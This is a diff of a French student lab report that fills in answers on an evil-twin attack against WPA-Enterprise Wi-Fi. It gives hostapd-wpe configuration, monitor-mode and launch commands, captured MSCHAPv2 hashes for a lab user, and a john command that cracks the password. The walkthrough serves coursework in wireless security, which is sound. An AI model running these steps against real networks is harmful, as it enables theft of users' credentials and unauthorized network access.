@@ -170,20 +170,95 @@ Pour implémenter l’attaque :
 ### Répondez aux questions suivantes :
 
 > **_Question :_** Quelles modifications sont nécessaires dans la configuration de hostapd-wpe pour cette attaque ?
-> 
+>
 > **_Réponse :_** 
+>
+> Le fichier de configuration de ```hostapd-wpe.conf``` se trouve dans le dossier ```/etc/hostapd-wpe```. Il contient tous les paramètres de configuration du hotspot malicieux.
+>
+> Dans ce fichier, il va falloir modifier les paramètres suivants (avec les valeurs associées):
+>
+> ```
+> interface=wlan0mon
+> ssid=HEIG-VD-Hack
+> ```
+>
+> Il est également possible de changer le canal (channel), au cas où on veut utiliser le même canal spécifique que l'Access Point légitime.
+>
+> Une fois ces paramètres changés, il va falloir mettre son antenne en mode "monitor", pour cela, il faut taper deux commandes:
+>
+> ```
+> sudo airmon-ng check kill #afin de killer les process qui utiliseraient l'interface
+> sudo airmon-ng start wlan0 #activer le mode monitor
+> ```
+>
+> Il suffit finalement de taper la commande suivante pour lancer l'AP malicieux:
+>
+> ```
+> sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+> ```
+>
+> Si la configuration du fichier est la bonne, le message ci-dessous devrait apparaître:
 
----
+> ```
+> Using interface wlan0mon with hwaddr 00:c0:ca:58:97:18 and ssid "HEIG-VD-Hack"
+> wlan0mon: interface state UNINITIALIZED->ENABLED
+> wlan0mon: AP-ENABLED
+> ```
 
-> **_Question:_** Quel type de hash doit-on indiquer à john pour craquer le handshake ?
-> 
-> **_Réponse:_** 
+​	Si la connexion se fait, une sortie semblable devrait apparaître:
+
+```
+mschapv2: Sun Jun  2 21:37:01 2019
+	 username:	patrick.neto
+	 challenge:	f6:7d:f7:6f:af:7b:ae:7b
+	 response:	72:5d:e0:90:5e:3b:63:f4:47:1d:34:76:83:bb:2d:f1:85:76:76:d4:7c:a5:86:68
+	 jtr NETNTLM:		patrick.neto:$NETNTLM$f67df76faf7bae7b$725de0905e3b63f4471d347683bb2df1857676d47ca58668
+	 hashcat NETNTLM:	patrick.neto::::725de0905e3b63f4471d347683bb2df1857676d47ca58668:f67df76faf7bae7b
+```
+
+​	On peut remarquer ici que le pseudo en clair et le hash du mot de passe sont récupérés.
+
+> **__Question:__** Quel type de hash doit-on indiquer à john pour craquer le handshake ?
+>
+> **_Réponse:_** Le hash NETNTLM doit être indiqué pour craquer le mot de passe.
+>
+> Pour craquer le mot de passe, il faut tout d'abord créer un fichier (exemple: crack.txt), dans lequel on va insérer le hash à craquer. Ensuite, il suffit de l'appeler dans la commande suivante 
+>
+> La commande suivante (avec john) permet de retrouver le mot de passe:
+>
+> ```
+> sudo john --format=netntlm crack.txt
+> ```
+>
+> Une fois la commande lancée, il ne suffit que de quelques secondes pour que le mot de passe soit trouvé (il était volontairement facile à trouver):
+>
+> ```
+> Using default input encoding: UTF-8
+> Rules/masks using ISO-8859-1
+> Loaded 1 password hash (netntlm, NTLMv1 C/R [MD4 DES (ESS MD5) 128/128 AVX 4x3])
+> Press 'q' or Ctrl-C to abort, almost any other key for status
+> toto             (patrick.neto)
+> 1g 0:00:00:02 DONE 3/3 (2019-06-02 21:46) 0.4166g/s 849275p/s 849275c/s 849275C/s ljeort..tm13
+> Use the "--show" option to display all of the cracked passwords reliably
+> Session completed
+> ```
+>
+> Le mot de passe est "toto".
 
 ---
 
 > **_Question:_** 6.	Quelles méthodes d’authentification sont supportées par hostapd-wpe ?
-> 
-> **_Réponse:_**
+>
+> **_Réponse:_** Hostapd-wpe support les méthodes d'authentification suivante (source: documentation github):
+>
+> ```
+>  1. EAP-FAST/MSCHAPv2 (Phase 0)
+>     2. PEAP/MSCHAPv2
+>     3. EAP-TTLS/MSCHAPv2
+>     4. EAP-TTLS/MSCHAP
+>     5. EAP-TTLS/CHAP
+>     6. EAP-TTLS/PAP
+> ```
 
 
 ## Quelques éléments à considérer :
